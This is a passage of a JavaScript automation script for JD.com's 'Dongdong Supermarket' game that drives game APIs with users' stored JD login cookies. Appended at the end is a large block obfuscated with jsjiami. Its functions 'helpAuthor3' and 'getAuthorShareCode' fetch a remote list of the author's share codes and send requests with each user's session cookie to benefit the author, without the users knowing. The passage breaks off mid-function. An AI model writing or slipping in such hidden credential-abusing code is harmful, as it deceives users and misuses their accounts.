          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//我的货架
function smtg_shelfList() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_shelfList'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//检查某个货架可以上架的商品列表
function smtg_shelfProductList(shelfId) {
  return new Promise((resolve) => {
    console.log(`开始检查货架[${shelfId}] 可上架产品`)
    $.get(taskUrl('smtg_shelfProductList', { shelfId }), (err, resp, data) => {
      try {
        // console.log(`检查货架[${shelfId}] 可上架产品结果:${data}`)
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//升级商品
function smtg_upgradeProduct(productId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_upgradeProduct', { productId }), (err, resp, data) => {
      try {
        // console.log(`升级商品productId[${productId}]结果:${data}`);
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          console.log(`升级商品结果\n${data}`);
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//解锁商品
function smtg_unlockProduct(productId) {
  return new Promise((resolve) => {
    console.log(`开始解锁商品`)
    $.get(taskUrl('smtg_unlockProduct', { productId }), (err, resp, data) => {
      try {
        // console.log(`解锁商品productId[${productId}]结果:${data}`);
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//升级货架
function smtg_upgradeShelf(shelfId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_upgradeShelf', { shelfId }), (err, resp, data) => {
      try {
        // console.log(`升级货架shelfId[${shelfId}]结果:${data}`);
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          console.log(`升级货架结果\n${data}`)
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//解锁货架
function smtg_unlockShelf(shelfId) {
  return new Promise((resolve) => {
    console.log(`开始解锁货架`)
    $.get(taskUrl('smtg_unlockShelf', { shelfId }), (err, resp, data) => {
      try {
        // console.log(`解锁货架shelfId[${shelfId}]结果:${data}`);
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_ground(productId, shelfId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_ground', { productId, shelfId }), (err, resp, data) => {
      try {
        // console.log(`上架商品结果:${data}`);
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_productList() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_productList'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_lotteryIndex() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_lotteryIndex', {"costType":1,"channel":1}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_drawLottery() {
  return new Promise(async (resolve) => {
    await $.wait(1000);
    $.get(taskUrl('smtg_drawLottery', {"costType":1,"channel":1}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function sortSyData(a, b) {
  return a['upgradeCostGold'] - b['upgradeCostGold']
}
function sortTotalPriceGold(a, b) {
  return a['previewTotalPriceGold'] - b['previewTotalPriceGold']
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(resolve => {
    console.log(`第${$.index}个京东账号的助力码:::${jdSuperMarketShareArr[$.index - 1]}`)
    if (jdSuperMarketShareArr[$.index - 1]) {
      newShareCodes = jdSuperMarketShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您未提供与京京东账号相对应的shareCode,下面助力将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    console.log(`格式化后第${$.index}个京东账号的助力码${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    // console.log('\n开始获取东东超市配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    // console.log(`东东超市已改版,目前暂不用助力, 故无助力码`)
    // console.log(`\n东东超市商圈助力码::${JSON.stringify(jdSuperMarketShareArr)}`);
    // console.log(`您提供了${jdSuperMarketShareArr.length}个账号的助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      url: "https://me-api.jd.com/user_new/info/GetJDUserInfoUnion",
      headers: {
        Host: "me-api.jd.com",
        Accept: "*/*",
        Connection: "keep-alive",
        Cookie: cookie,
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-cn",
        "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
        "Accept-Encoding": "gzip, deflate, br"
      }
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.logErr(err)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === "1001") {
              $.isLogin = false; //cookie过期
              return;
            }
            if (data['retcode'] === "0" && data.data && data.data.hasOwnProperty("userInfo")) {
              $.nickName = data.data.userInfo.baseInfo.nickname;
            }
          } else {
            $.log('京东服务器返回空数据');
          }
        }
      } catch (e) {
        $.logErr(e)
      } finally {
        resolve();
      }
    })
  })
}
function getTeam() {
  return new Promise(async resolve => {
    $.getTeams = [];
    $.get({url: `http://jd.turinglabs.net/api/v2/jd/supermarket/read/100000/`, timeout: 100000}, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} supermarket/read/ API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
          $.getTeams = data && data['data'];
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=jdsupermarket&clientVersion=8.0.0&client=m&body=${escape(JSON.stringify(body))}&t=${Date.now()}`,
    headers: {
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Host': 'api.m.jd.com',
      'Cookie': cookie,
      'Referer': 'https://jdsupermarket.jd.com/game',
      'Origin': 'https://jdsupermarket.jd.com',
    }
  }
}
/**
 * 生成随机数字
 * @param {number} min 最小值（包含）
 * @param {number} max 最大值（不包含）
 */
function randomNumber(min = 0, max = 100) {
  return Math.min(Math.floor(min + Math.random() * (max - min)), max);
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodj='jsjiami.com.v6',_0x1913=[_0xodj,'KWzCu0V4','wrDDqMKRCRRBwpBffADCqjR8','w7/CpMOZwrbChgIwwrkpwpXCg009','worDuDBaMQ==','woNiLBrDjQ==','I3HCjW5wwr0eJDXCl8K4w7bDvw==','f8OvwqFbw4zDuA==','cVrCr8OKwo7CgsK3w6BsCMKPKsOV','wocgwpUTwpPDog==','w53Dp8OYwpjCscO4bxA/CzFnw6Q=','wo9NwpHCuMOQw5tERQjCuE8oHQbCqBvDsT7DuXYRwqbCjsKCw5JiacOhRMOQfMO8w5LCs3l+RsKvwpzDixbDj0F7JHB+w7PCkMKJWywSwpvDsxDCgBduEsOlNsKrChg9KSZew73CmsKcDDLCrsKvwqlowqjDi8Okw4HCg8K4OElnUTIbwpHDuMOHYjRuET0XwpUOw4nCmsORwoAEwqZuwoPCr8Kuwq3DocO+w4MvMQ==','WcKvw5hCw70=','NMKWdMKDWiXCusKzwoY=','w7nDhz8TPA==','aQEiTHQ=','w6nDssOhwoDCpg==','w7rDisO8wo3Cqw==','GknCkGtP','w4p8FsKUwq4=','w6nCvBc=','w7pHEw==','w7NRw7VrwqTDqcODDMOQw7UrRglYGWvDpj/DlBl0ex5aw4TDv0oVw7/DgsK5BcOTw5QLwp3DtH9AA8OGbVJhNsO7w6TDr8K9cgvDgBIEHwHCjUAgNsOswp9zasKnJsKYwrRmBELDqzRMwrvCnk/CvnRd','w43DmDtsBUnCvcOdXsOEY3c=','w6XDlMKFCmNNw7bDqMKGD8O4ZwfDmVbCgyxBXcKeZ8O0MsOHwonDgsKnwpMmNMO3GsOV','w4TDnCYyG13DuMKWGMKSIndLw6oww5rDncK7Ew==','w5twZGVNXxM+fBHDiiJOw781YBTCi8KFw55KwoHDjsKGwq09w5RFe2QPw7FkPVjCvGrDiGhhDBPCusKdw7/DlxI8B8OCw5tyVMO4wrB4fHgRFcK2Hw/CnsKRwrwVNcOFbcO7w7kGP8K+w5PDk8K2wrLClMKnw4zCiXk0wr1XwplJB8OvbMK7wpdQwqQNScKSIn8XUHjCr8Kvezs4AMOVMsOtw7vDqsKZCcKaRGAgRzfCucKBO0jDniofFsO9wqlhw6PCmcKUw4tQRBvComnDkMKIcm8oXQ7DgGDCkFQZA8KGIHvDvmLCnsKsw61nw6UwMBVrAMOMw5sAw4pOV0fDiTYACMKlw5R2w6/DtMO4ZMOOKsOYwovCmCnCjMOCJi8aRMKAJ37CtxvCmsO3PsOFwpHCqcK3w63DkMOcHDhxw5h5wptCUcOyw5HClMO/FcODTsOBPFLDncKTwpkSw5LCpRPDvMK5WMKgwrvDs8OuKSNdPsOsN8KuHsKEe1LClgbDlcKfwozDgXl3wpvCv8ODB0TClMO3w51YZsKvVMOSGGdIwoLDpDAHSMOjQ33DklJ2AMOvJ8Ouw4kPOWfDmcKJPx9XwpDChMO3RsK3woBQbMOkRcKuD8Olw7nDlGBIw7/Do8KdIsKVHMKnCMO5YkrDrQxdwrQdbw89LEHCglcIGcOUwpdcwrktw4XCvcObwoJsEjc4WTXCpVvDhz/CssKXwq1tw7TCrcO3KcKXwq3CpmcJKSoew4/CgFh9wrDDoxgNwq9sEDFfUzjDglhMD8Ktw79oPcOXLcK8Zn7CmsKIwozDsTV2fVJ+wqzDv8OgwqDCuDPCkE1jGBjDsSnDtcOHwr7CmcKuwrRgQmjDoMOAw5waVijCnsO5wpcPwr43wqzDp1x2w7QIIsKiAcKKw4BmAnHCvijDscKhVMKvwqBSVW4YUHYww77Cs8KHLxMxwp3CvsOOdHXCmMO0TVhKHcKpwpzDkXwgwq7DkcObw6vDv8OtwrvDs0vDuzHDjMO0HcKcw4fCg1zClH9qw6PCisOtbRfCqkLCiBFrw5l6wo3ClF54N8Ozw60VGSLDtGbCmU59wr47w7Z5w5Ygw73Csg==','OsOgC8OHwqI=','w5oNHsKew4PDkWTDhBJqwo7CmsKlw5kqw6/DrzbDjMOic01Mw7VWw5Ijw4xnDcOgw5VsI8Odw4nCrH3Cl8KpB2wNwoZ6w7NCw5N1YsKEwroIKgnDuMOOwp/Cqm7Ct8OkOcKmwqgBw6zCmGNzw4vDsB5kXsKsw6cEwpjCnmPCksKqFsKtwoXCocKFRws3bcKmw403TMKETMKoPhF4w4/CtMKow73Cg8KDM8OjwoXDjsOXGkwaw545E8Orwq7DlMO6GUXDsl/CpMOBw7jCu8OIIMKNRkEmw64jw5nCvy3DhxrCkMKhdiTDoA==','J0DCmWla','DMKLw5PCoMO9','bEbCkMOxwro=','wpDDg17DvGI=','w4PCthk8bsKsY8KDSiDCncOZwptMQiFGK0HCtlvDl0vDqAk6w4d5e8KqwphbwovCjcK8f8OAw7bDu3nDvsKww5Q7aEwNKsOkfMKawqg1S1k2w6bCnMO4wrBMFQIoD8KoC8OaGsOLSBzCrAbCsiXDoMK8JxbClG1BRUPCgMKXAMK2w7tjQjrCvMKfwrXCv8OGw5MnG8O6UcODw7PDkl5cRQR5w6cEEcKlwq1xw5zCo8KtwqAtXULCrcOJwq0dw6djVcOlw5AeEsOcwqxnwphMw5VQKR9pwq/CkUDCt8KrwpzDkQ3DiX3CpQ==','w6jClMOhwpPCsw==','wqBfwoDCr8Og','wozChcKBcDE=','wqBwwpbChsOE','RsKHw73CjHw=','dSnCp13DhA==','D8KXYsKvZQ==','w7tuJ8Oxwq8=','wqdewqhOwo4=','AMK0w4LCp8Ou','wp5MwqDCr8Oi','wovDhsK4YgA=','wpvDhcKjQQw=','PsK3woPDlMKR','w55Rw6V0woc=','wq7CkX4=','wr0oW8OeSg==','P8KewqfDjcKx','w4jCscOeA8O4','LAk7w5jCuw==','woHChGzCncOX','wr0TccO+fw==','VEPClMOvwrQ=','w7JwLcOMwqw=','wo7CklLCk8Ok','w4MBL8Kmw5o=','wps9e04m','wpsVemTChQ==','wrXDsWrDuGI=','wovCjcKOcCs=','wrLDpkjDhms=','fmZfUHs=','wrlZGzrDug==','woDCjMKdeDQ=','BcOfXsOxwrQ=','S1tEU00=','w5bCoMOaLMOP','wo0uV8OGfxfClcKDwpHCkMOSAnDCrMKxXVhLTsOMwr7DksOydwlMw7YwL2DDoDLDkVMYN8ODNsKITSsHwoXDv8KRMSpgaCcAShjDicO6w5QJYE7DpcKyw7oYOMONw57CsmVIQDxQw5XDvxnCkMKAUcKXwqfDiw/Cv8OqwrXDo2HDqHbCqBYDw4rDiMKMQsKiCcKcwrItcBrDlMKLYcKCwrsBEcO+wrViw6zDgMOsw44=','w6LDj8KNwooL','w5/DnCArBgDCvsOfCQ==','w5LCn8O+F8Od','IWbCqEBG','w6RdMsOXwp0=','w6nDnMOvwrbCkg==','YxwZY3A=','w6V2C8KwwpQ=','wqXDok4=','RVPCug==','wr7ClWPCqw==','w7rCocOzwrPCuA==','w58KYcK6OMOiw57CjBkSEiU=','woo1wosYwo7DqcKDwoUzacOLw5vChcOlw48JZwvCtz/DrMKYb8KVw7jCiSd4w5E7wqTCmwE=','RCjCt0nDvgLCvRfDpMOKw4nDoMKGJcKQw77Cm8OYdw==','wr9+wo5PwpDDuj/CmWUHHAJXw6nDvMKcWGU7CMKjJFnDh1PCuAUww6hLSAXDkk/Dq0lsw5zDmMKvw4rCoj3Dm2zCgsKvw73CmyZDEcOYw5llwoBNJ8Ouw7Icw4ViAMO6Nz3DkSFydBRbwpzClcKHQXNRwpAeFU8Mw60zwrLCqg3Cp8K1wp/CulkjZ1TClDQqwr/Cqy7DlnvCvMOwNx4zw7zCuMKbUF7CjzVrS2FqwqtBwqxCNcK3wpHClsKJwpHChzswYcKHWRkCwr8qakfCtsOteMKxMRvDpMK4LsKMw5jCtnjCqBbDtmDCo13DnwcyaMO6XjPCmUrCn8KEw7NRDsOuPsOwd8OBKBbDt0hww5rCusKcwrHDgxHChjHCugMkAQlQw7nCixfCpCPDlcKMZsOwE1/CmFXCsidVwqHCncOGw75nwqvDjVbCocOYwpDDpUk1XQjCosKww6bCm8O9woHCvRt4wqhBRQxbw4TDnCvDv08DwpXDjlgSwp/CkTVkwoZyF8KnGnXDrsK6woLCisObw7kOwqrDvV1SV8Okw5fCt3fDkgzCnsORw405eHbDvcOpwr8BGSXCmnM1TcOrAsKBw6vCucKZHHFMwo/CosKwDnRrw4Vic8KFF8KTb8KrL8ObVsK7H8KmwqAEwqkcwqTDtCzDucOxPMOqwr3DkMKSVAF0wogyw5EBwoRBwrRyaBTDvsODwqzDtgHDoMKGb2AFS0nCgsKLeBjDvDpBQwt1w7dPwokhVMKAw4EnwqnDrMO3WMKNw7HChMKiw6PDv2vDuhPDkVHCklPChMKZwrvCkknDlMOGw6BswrDDuMOgw7pzBFsWQV4Ow7doA8KJwo1fwonDjmDCpjrCk8KOw6jDsMOswpsNfUXDuMOdwqFDcWAyGz0ewroSwr3CnmTCmDk7w67Dn8K0ZGbDmHPDr8OFw53DhT7DqRPChnXCgDg2wqlcw7vDlS8yUcKLTjjDqMKLPsKddsOgw4UAVcKPfFXDslx6w4bDu8O5w5Mnwrw8EjrCnjzDocO0f15qw7LDviNTwojDhMOIGmZ0eXhhwrd1wrnCpcK3w6LDpHAsw7DDrA5Hw6zCjMOPVTDDs3ArfT7CpMKBZsK8','woDDo01NBw==','woEyZ1PCjMOLwo5vTcOKw7JpwqvDnsK0G8KmYkZ/fkVPVW7CoMKIw5ExGXDDkHHCusOWVMKGw6zDpjTCl39KBMO/wp51e2TDscO7w4YQwqVeCMOxCMO1bzUOwqs2wq1yw6QbFWhrTxcbw6F1wrnDiVfDiSpAwpHCssKPFXsyc8K3JMORwpN5wpPDkhkwNsO7F1cww5E1UQh8SHjCrMK9w4Fnw6nCqAIKw5nDoTdFwo/CrcOjwqTDoXLCvsOyEljDscO7cgjCocOvPSVFwplgwrMaB8K8YcOq','w7/CvMOCwpjCmg==','wqDDpsKgbT8S','w6/DkcKFwp0M','Xg8kQms=','w57Dr8KEw6nCjQ==','XW55Slo=','w5nCrcOKF8On','w6FQw6nDj35l','wrDDsMKKJwg=','ZXqjsXjwBAiwTaSLmeiQ.comJ.CvBL6=='];(function(_0x43c54c,_0x2b1e75,_0x51309c){var _0x13f762=function(_0x1a71e4,_0x15454b,_0x3bb5e2,_0x3dd562,_0x13317c){_0x15454b=_0x15454b>>0x8,_0x13317c='po';var _0x16cfed='shift',_0x5c5e9c='push';if(_0x15454b<_0x1a71e4){while(--_0x1a71e4){_0x3dd562=_0x43c54c[_0x16cfed]();if(_0x15454b===_0x1a71e4){_0x15454b=_0x3dd562;_0x3bb5e2=_0x43c54c[_0x13317c+'p']();}else if(_0x15454b&&_0x3bb5e2['replace'](/[ZXqXwBAwTSLeQJCBL=]/g,'')===_0x15454b){_0x43c54c[_0x5c5e9c](_0x3dd562);}}_0x43c54c[_0x5c5e9c](_0x43c54c[_0x16cfed]());}return 0x7eae7;};return _0x13f762(++_0x2b1e75,_0x51309c)>>_0x2b1e75^_0x51309c;}(_0x1913,0x1db,0x1db00));var _0x1b99=function(_0x5e4c2a,_0x27135b){_0x5e4c2a=~~'0x'['concat'](_0x5e4c2a);var _0x50c36a=_0x1913[_0x5e4c2a];if(_0x1b99['yLMgyT']===undefined){(function(){var _0x1add2e=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x237db8='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1add2e['atob']||(_0x1add2e['atob']=function(_0x3c5a27){var _0x2324b8=String(_0x3c5a27)['replace'](/=+$/,'');for(var _0x37d913=0x0,_0x3ab23e,_0x2555fb,_0x11e22b=0x0,_0x8ba1c5='';_0x2555fb=_0x2324b8['charAt'](_0x11e22b++);~_0x2555fb&&(_0x3ab23e=_0x37d913%0x4?_0x3ab23e*0x40+_0x2555fb:_0x2555fb,_0x37d913++%0x4)?_0x8ba1c5+=String['fromCharCode'](0xff&_0x3ab23e>>(-0x2*_0x37d913&0x6)):0x0){_0x2555fb=_0x237db8['indexOf'](_0x2555fb);}return _0x8ba1c5;});}());var _0x2d2d99=function(_0x3dae13,_0x27135b){var _0x5e71d0=[],_0x2dfab1=0x0,_0x4f552a,_0x53c2e1='',_0x315589='';_0x3dae13=atob(_0x3dae13);for(var _0x36335d=0x0,_0x157a4f=_0x3dae13['length'];_0x36335d<_0x157a4f;_0x36335d++){_0x315589+='%'+('00'+_0x3dae13['charCodeAt'](_0x36335d)['toString'](0x10))['slice'](-0x2);}_0x3dae13=decodeURIComponent(_0x315589);for(var _0x3d0af1=0x0;_0x3d0af1<0x100;_0x3d0af1++){_0x5e71d0[_0x3d0af1]=_0x3d0af1;}for(_0x3d0af1=0x0;_0x3d0af1<0x100;_0x3d0af1++){_0x2dfab1=(_0x2dfab1+_0x5e71d0[_0x3d0af1]+_0x27135b['charCodeAt'](_0x3d0af1%_0x27135b['length']))%0x100;_0x4f552a=_0x5e71d0[_0x3d0af1];_0x5e71d0[_0x3d0af1]=_0x5e71d0[_0x2dfab1];_0x5e71d0[_0x2dfab1]=_0x4f552a;}_0x3d0af1=0x0;_0x2dfab1=0x0;for(var _0x170504=0x0;_0x170504<_0x3dae13['length'];_0x170504++){_0x3d0af1=(_0x3d0af1+0x1)%0x100;_0x2dfab1=(_0x2dfab1+_0x5e71d0[_0x3d0af1])%0x100;_0x4f552a=_0x5e71d0[_0x3d0af1];_0x5e71d0[_0x3d0af1]=_0x5e71d0[_0x2dfab1];_0x5e71d0[_0x2dfab1]=_0x4f552a;_0x53c2e1+=String['fromCharCode'](_0x3dae13['charCodeAt'](_0x170504)^_0x5e71d0[(_0x5e71d0[_0x3d0af1]+_0x5e71d0[_0x2dfab1])%0x100]);}return _0x53c2e1;};_0x1b99['saoqal']=_0x2d2d99;_0x1b99['JzEZVs']={};_0x1b99['yLMgyT']=!![];}var _0x69a497=_0x1b99['JzEZVs'][_0x5e4c2a];if(_0x69a497===undefined){if(_0x1b99['iNNNzG']===undefined){_0x1b99['iNNNzG']=!![];}_0x50c36a=_0x1b99['saoqal'](_0x50c36a,_0x27135b);_0x1b99['JzEZVs'][_0x5e4c2a]=_0x50c36a;}else{_0x50c36a=_0x69a497;}return _0x50c36a;};async function helpAuthor3(){var _0x1a92e7={'yqItq':function(_0x48eb73,_0x2e5f99){return _0x48eb73-_0x2e5f99;},'TZnky':function(_0xdbabb9,_0x3fc135){return _0xdbabb9>_0x3fc135;},'SbELo':function(_0x5b6e90,_0x5188cd){return _0x5b6e90*_0x5188cd;},'cJwSr':function(_0xe7e900,_0x5b48cd){return _0xe7e900+_0x5b48cd;},'yiDfq':function(_0x10900a){return _0x10900a();},'psPtX':function(_0x45f9c3,_0x549869,_0x202c89){return _0x45f9c3(_0x549869,_0x202c89);},'JZESR':function(_0x42c454,_0x2cab4f){return _0x42c454>_0x2cab4f;},'cTtdJ':function(_0x4df1dd,_0x559548){return _0x4df1dd(_0x559548);},'UomQT':_0x1b99('0','tIa^'),'cThef':_0x1b99('1','IvYa'),'GaKUn':_0x1b99('2','LUFk'),'TYVXc':_0x1b99('3','iGLS'),'JLoHF':_0x1b99('4','MZ]x'),'Wider':_0x1b99('5','vXjF')};function _0x5c0181(_0xd695bf,_0x30a3e0){let _0x2a7f8b=_0xd695bf[_0x1b99('6','#t8L')](0x0),_0x3d44ce=_0xd695bf[_0x1b99('7','QYZa')],_0x4dfcc5=_0x1a92e7[_0x1b99('8','EEe^')](_0x3d44ce,_0x30a3e0),_0x261f59,_0x5b8782;while(_0x1a92e7[_0x1b99('9','jU@t')](_0x3d44ce--,_0x4dfcc5)){_0x5b8782=Math[_0x1b99('a','rcIK')](_0x1a92e7[_0x1b99('b','n#kT')](_0x1a92e7[_0x1b99('c','QJGG')](_0x3d44ce,0x1),Math[_0x1b99('d','8U23')]()));_0x261f59=_0x2a7f8b[_0x5b8782];_0x2a7f8b[_0x5b8782]=_0x2a7f8b[_0x3d44ce];_0x2a7f8b[_0x3d44ce]=_0x261f59;}return _0x2a7f8b[_0x1b99('e',')]Ac')](_0x4dfcc5);}let _0x2a9094=await _0x1a92e7[_0x1b99('f','hdhx')](getAuthorShareCode),_0x523d77=[];$[_0x1b99('10',')]Ac')]=[..._0x2a9094||[],..._0x523d77||[]];$[_0x1b99('11','#t8L')]=_0x1a92e7[_0x1b99('12','MZ]x')](_0x5c0181,$[_0x1b99('11','#t8L')],_0x1a92e7[_0x1b99('13','m4ey')]($[_0x1b99('14','hdhx')][_0x1b99('15','v6Ji')],0x3)?0x6:$[_0x1b99('16','gTBi')][_0x1b99('17','IvYa')]);for(let _0xced0dd of $[_0x1b99('18','SJqf')]||[]){const _0xd2d746={'url':_0x1b99('19','1&Y[')+_0x1a92e7[_0x1b99('1a','hR8l')](escape,JSON[_0x1b99('1b','*ehp')](_0xced0dd)),'headers':{'Host':_0x1a92e7[_0x1b99('1c','][Xt')],'accept':_0x1a92e7[_0x1b99('1d','jU@t')],'origin':_0x1a92e7[_0x1b99('1e','SJqf')],'user-agent':_0x1a92e7[_0x1b99('1f','SJqf')],'accept-language':_0x1a92e7[_0x1b99('20','hdhx')],'referer':_0x1a92e7[_0x1b99('21','k1Nq')],'Cookie':cookie}};$[_0x1b99('22','Kkn#')](_0xd2d746,(_0x48f64f,_0x5c4b49,_0x553ed8)=>console[_0x1b99('23','D2X]')](_0x553ed8));}}function getAuthorShareCode(_0x324b83=_0x1b99('24','u6dc')){var _0x802afa={'dDJhL':function(_0x28d5d5,_0x1f9ec2){return _0x28d5d5(_0x1f9ec2);},'GfegC':_0x1b99('25','][Xt'),'mCejk':_0x1b99('26','XGhN'),'GIsNg':_0x1b99('27','][Xt'),'hMIwD':_0x1b99('28','x]gf'),'YuddI':_0x1b99('29','3Juj'),'HudEQ':_0x1b99('2a','UzUS'),'mFSGu':function(_0xa8bd0e,_0x2af67e){return _0xa8bd0e===_0x2af67e;},'rDGqn':_0x1b99('2b','hdhx'),'xJrmB':function(_0x267cb6,_0x138b89){return _0x267cb6!==_0x138b89;},'yuEgA':_0x1b99('2c','GtgS'),'GEvhK':_0x1b99('2d','gHS&'),'WFmKG':function(_0x56cb0c,_0x34d887){return _0x56cb0c===_0x34d887;},'qCGOn':_0x1b99('2e','RPCa'),'EtdoP':function(_0x3af92f,_0x3409c6){return _0x3af92f(_0x3409c6);},'XrxhF':_0x1b99('2f','Kkn#'),'vqXHG':function(_0x2fdb13){return _0x2fdb13();}};return new Promise(async _0x350abf=>{var _0x4b605c={'pjcVN':function(_0x29fbeb,_0x820586){return _0x802afa[_0x1b99('30','#t8L')](_0x29fbeb,_0x820586);},'rVcGm':_0x802afa[_0x1b99('31','1&Y[')],'lxkHq':_0x802afa[_0x1b99('32','qe#n')],'HpfBW':_0x802afa[_0x1b99('33','1&Y[')],'XIRHs':_0x802afa[_0x1b99('34','p^]%')],'VmIhC':_0x802afa[_0x1b99('35','LUFk')],'dXYzv':_0x802afa[_0x1b99('36','*ehp')],'GfXLd':function(_0x47a240,_0x521855){return _0x802afa[_0x1b99('37','D2X]')](_0x47a240,_0x521855);},'qxEHj':_0x802afa[_0x1b99('38','iGLS')],'rSiGz':function(_0x2edc72,_0x109660){return _0x802afa[_0x1b99('39','GtgS')](_0x2edc72,_0x109660);},'wvPMl':_0x802afa[_0x1b99('3a','1&Y[')],'jKjjq':_0x802afa[_0x1b99('3b','QYZa')],'aJybn':function(_0x3e3007,_0x60854){return _0x802afa[_0x1b99('3c','QYZa')](_0x3e3007,_0x60854);},'EWxUx':_0x802afa[_0x1b99('3d','yX9F')],'lGghZ':function(_0x3895cb,_0x17b8ea){return _0x802afa[_0x1b99('3e','u6dc')](_0x3895cb,_0x17b8ea);}};$[_0x1b99('3f','C4eE')]({'url':_0x324b83,'headers':{'User-Agent':_0x802afa[_0x1b99('40','x67a')]},'timeout':0x2710},async(_0x180af7,_0x177fd8,_0x550f58)=>{var _0x4a57ab={'toAcv':function(_0x3fb2d0,_0x512eda){return 